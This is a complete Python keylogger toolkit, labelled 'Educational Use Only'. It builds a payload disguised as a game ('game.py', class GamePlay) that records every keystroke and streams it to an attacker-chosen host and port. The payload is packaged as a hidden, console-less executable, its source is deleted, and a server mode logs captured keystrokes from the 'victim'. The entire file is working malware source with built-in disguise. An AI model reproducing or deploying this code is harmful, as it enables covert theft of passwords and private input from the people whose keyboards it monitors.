import socket
import argparse
import os
import time
import subprocess
import shutil
from pathlib import Path


class KeyloggerConfig:
    """
    Configuration management class for the keylogger application
    Handles command line arguments parsing and stores application settings
    """
    
    def __init__(self):
        # Initialize default configuration values
        self.host = "0.0.0.0"  # Default bind address for server
        self.port = None       # Port number (required for both modes)
        self.mode = None       # Operation mode: SM (server) or CP (create payload)
        self.file_path = None  # Output file path for saving captured keystrokes
        self.payload_name = "game.py"  # Default payload filename
        self.enable_output_file = False  # Flag to enable file output logging
        self.keylogger_file = None  # File handle for logging output
    
    def parse_arguments(self):
        """
        Parse command line arguments using argparse
        Provides automatic validation, help generation, and error handling
        """
        parser = argparse.ArgumentParser(
            description="Reverse Keylogger Proof of Concept - Educational Use Only",
            epilog="Example usage:\n  python main.py -M CP -H 192.168.1.100 -p 4444\n  python main.py -M SM -H 0.0.0.0 -p 4444 -o keystrokes.log"
        )
        
        # Define command line arguments with validation
        parser.add_argument("-M", "--mode", required=True, choices=["SM", "CP"],
                        help="Operation mode: SM (Server Mode) or CP (Create Payload)")
        
        parser.add_argument("-H", "--host", default="0.0.0.0",
                        help="Host address for binding (server) or connecting (payload). Default: 0.0.0.0")
        
        parser.add_argument("-p", "--port", type=int, required=True,
                        help="Port number for communication (required, range: 1-65535)")
        
        parser.add_argument("-n", "--name", default="game.py",
                        help="Output filename for the generated payload. Default: game.py")
        
        parser.add_argument("-o", "--output",
                        help="Output file to save captured keystrokes (server mode only)")
        
        # Parse arguments and store values
        args = parser.parse_args()
        
        # Assign parsed values to configuration
        self.mode = args.mode
        self.host = args.host
        self.port = args.port
        self.payload_name = args.name
        
        # Enable file output if output file is specified
        if args.output:
            self.file_path = args.output
            self.enable_output_file = True


class PayloadCreator:
    """
    Class responsible for creating and building the keylogger payload executable
    Generates Python source code and compiles it to standalone executable
    """
    
    def __init__(self, config):
        self.config = config  # Reference to configuration object
    
    def get_payload_content(self):
        """
        Generate the payload source code with configured settings
        Returns a string containing the complete Python payload code
        """
        return f"""import socket
import keyboard


class GamePlay:

    def __init__(self,HOST,PORT):
        self.HOST = HOST
        self.PORT = PORT
        self.Client = None
        
    def StartConnection(self):
        try:
            self.Client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.Client.connect((self.HOST,self.PORT))
            while True:
                event = keyboard.read_event()
                if event.event_type == "down":
                    self.Client.sendall((event.name.encode()))
        except ConnectionAbortedError:
            pass
        except ConnectionRefusedError:
            pass
        except Exception as e:
            pass
        finally:
            if self.Client:
                self.Client.close()

if __name__ == "__main__":
    game = GamePlay("{self.config.host}",{self.config.port})
    game.StartConnection()
"""
    
    def create_payload(self):
        """
        Main method to create the complete payload executable
        Handles source generation, compilation, and cleanup
        Returns the path to the created executable
        """
        p = Path(self.config.payload_name)
        stem = p.stem 
        exe_suffix = ".exe" if os.name == "nt" else ""
        exe_name = stem + exe_suffix
        
        # Write payload source code to file
        with open(p, "w", buffering=1, encoding="utf-8") as file:
            payload = self.get_payload_content()
            file.write(payload)
        print(f"Payload '{self.config.payload_name}' created successfully!")
        
        # Build executable from source using PyInstaller
        self._build_executable(p, stem, exe_name)
        
        # Clean up temporary build files
        self._cleanup_files(p, stem)
        
        return f"Build succeeded: {exe_name}"
    
    def _build_executable(self, p, stem, exe_name):
        """
        Build executable using PyInstaller
        Compiles Python source to standalone executable with no console window
        """
        print("Building executable...")
        time.sleep(1)
        
        # PyInstaller command to create single-file executable without console
        cmd = ["pyinstaller", "--onefile", "--noconsole", str(p)]
        
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, check=True)
            if res.stdout:
                print(res.stdout)
            if res.stderr:
                print(res.stderr)
        except subprocess.CalledProcessError as e:
            print("PyInstaller failed:", e.returncode)
            if e.stdout:
                print(e.stdout)
            if e.stderr:
                print(e.stderr)
            raise
        
        # Locate the built executable in dist directory
        dist_path = Path("dist") / exe_name
        if not dist_path.exists():
            candidates = list(Path("dist").glob("*"))
            if candidates:
                dist_path = candidates[0]
            else:
                raise FileNotFoundError(f"No build output found in dist/ for {exe_name}")
        
        # Move executable to current working directory
        dest = Path.cwd() / dist_path.name
        try:
            if dest.exists():
                dest.unlink()
            shutil.move(str(dist_path), str(dest))
            print("Moved:", dist_path, "->", dest)
        except Exception as e:
            print("Failed to move exe:", e)
            raise
    
    def _cleanup_files(self, p, stem):
        """
        Remove temporary build files created by PyInstaller
        Cleans up build artifacts to leave only the final executable
        """
        shutil.rmtree("build", ignore_errors=True)
        shutil.rmtree("dist", ignore_errors=True)
        
        try:
            Path(f"{stem}.spec").unlink(missing_ok=True)
        except Exception:
            pass
        
        try:
            p.unlink(missing_ok=True)
            print("Removed source:", p)
        except Exception as e:
            print("Failed to remove source:", e)


class ServerMode:
    """
    Class for server mode operation - receives and logs keystrokes from connected clients
    Listens for incoming connections and captures keyboard input
    """
    
    def __init__(self, config):
        self.config = config
    
    def start_server(self):
        """
        Start the server and listen for incoming connections
        Continuously receives and processes keystroke data from clients
        """
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.config.host, self.config.port))
        server.listen()
        
        print(f"Listening in port : {self.config.port}")
        client, addr = server.accept()
        
        print(f"Victim connected ! {addr}")
        print("reverse keylogger started !")
        
        if self.config.enable_output_file:
            print(f"Keylogger has been saved to {self.config.file_path}")
        
        try:
            # Main loop to receive and process keystrokes
            while True:
                try:
                    data = client.recv(1024)
                    if not data:
                        break
                    
                    decoded_data = data.decode()
                    print(decoded_data)
                    
                    # Write to file if file output is enabled
                    if self.config.enable_output_file and self.config.keylogger_file:
                        self.config.keylogger_file.write(f"{decoded_data}\n")
                        self.config.keylogger_file.flush()
                        
                except Exception as err:
                    print(err)
                    break
                    
        finally:
            # Cleanup resources - ensure proper closure of connections and files
            server.close()
            if self.config.enable_output_file and self.config.keylogger_file and not self.config.keylogger_file.closed:
                self.config.keylogger_file.close()
            if client:
                client.close()


class KeyloggerApp:
    """
    Main application class that coordinates all components
    Orchestrates the configuration, payload creation, and server operation
    """
    
    def __init__(self):
        self.config = KeyloggerConfig()
    
    def run(self):
        """
        Main application entry point
        Parses arguments and executes the selected operation mode
        """
        try:
            # Parse command line arguments
            self.config.parse_arguments()
            
            # Initialize file output if enabled
            if self.config.enable_output_file:
                self.config.keylogger_file = open(self.config.file_path, "w", buffering=1, encoding="utf-8")
            
            # Execute based on selected mode
            if self.config.mode == "SM":
                # Server mode - receive keystrokes from connected clients
                if self.config.port is not None:
                    server = ServerMode(self.config)
                    server.start_server()
                else:
                    print("Error : Port not specified")
                    exit(1)
            
            elif self.config.mode == "CP":
                # Create payload mode - generate keylogger executable
                if self.config.host is None or self.config.host == "0.0.0.0" or self.config.port is None:
                    print("Please specify HOST and PORT for payload")
                    exit(1)
                else:
                    creator = PayloadCreator(self.config)
                    result = creator.create_payload()
                    print(result)
                    
        except KeyboardInterrupt:
            print("Canceled by user")
        except Exception as e:
            print(f"Application error: {e}")

if __name__ == "__main__":
    app = KeyloggerApp()
    app.run()